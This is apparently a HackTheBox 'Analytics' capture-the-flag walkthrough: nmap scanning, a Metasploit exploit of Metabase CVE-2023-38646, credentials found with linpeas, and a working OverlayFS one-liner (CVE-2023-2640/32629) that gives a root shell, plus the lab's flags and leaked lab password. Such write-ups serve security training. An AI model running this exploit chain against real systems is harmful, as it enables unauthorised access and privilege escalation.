# Analytics Walkthrough

This is my walkthrough for HackTheBox [Analytics Box](https://app.hackthebox.com/machines/Analytics)

<figure><img src="../../../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

First we scan the Machine

```bash
nmap -T4 -Pn -v 10.129.85.38
```

<figure><img src="../../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

We see port 22 and 80 open.

Browse to the website and we get an error, add the IP and domain to the hosts file.&#x20;

<figure><img src="../../../.gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>

Now going back to the website we can look around!

<figure><img src="../../../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

Looking around, we see the Login page at the top. Checking that out, it doesn't work BUT the URL has changed to `data.analytical.htb`, so let's add that to the hosts file as well.

<figure><img src="../../../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>

When looking we see it's running Metabase.

<figure><img src="../../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

Search for Metabase exploits on google as well as in metasploit. I find [this blog](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) talking about Chaining our way to Pre-Auth RCE in Metabase (CVE-2023-38646)

In Metasploit we see a potential exploit

<figure><img src="../../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

Let's check the options and set them

<figure><img src="../../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>

Send the exploit....

<figure><img src="../../../.gitbook/assets/image (493).png" alt=""><figcaption></figcaption></figure>

We have a shell! Now let's see if we can get and run linpeas.

<figure><img src="../../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>

We can! Run it!

&#x20;

<figure><img src="../../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

We see in the "Environment" section, a user and a password

&#x20;

<figure><img src="../../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>

```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

Let's ssh into the machine with the newly discovered username and password.

```bash
ssh metalytics@10.129.85.38
```

<figure><img src="../../../.gitbook/assets/image (497).png" alt=""><figcaption></figcaption></figure>

Got the user flag! `5f24e4536b318d506fe1a38fbbd959fa`

<figure><img src="../../../.gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>

### Priv Escalation

I seen we were running Ubuntu 22.04.3 as we logged in.

&#x20;

<figure><img src="../../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>

A simple google search for "Ubuntu 22.04.3 priv escalation" shows me [this reddit post](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu\_local\_privilege\_escalation\_cve20232640/) about Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629) with multiple references. They list how you can get root using the OverlayFS module with this command:

```bash
unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
```

We have root! `f35c47aac97cb1a6b5450d4eb024a3cc`

<figure><img src="../../../.gitbook/assets/image (500).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (501).png" alt=""><figcaption></figcaption></figure>
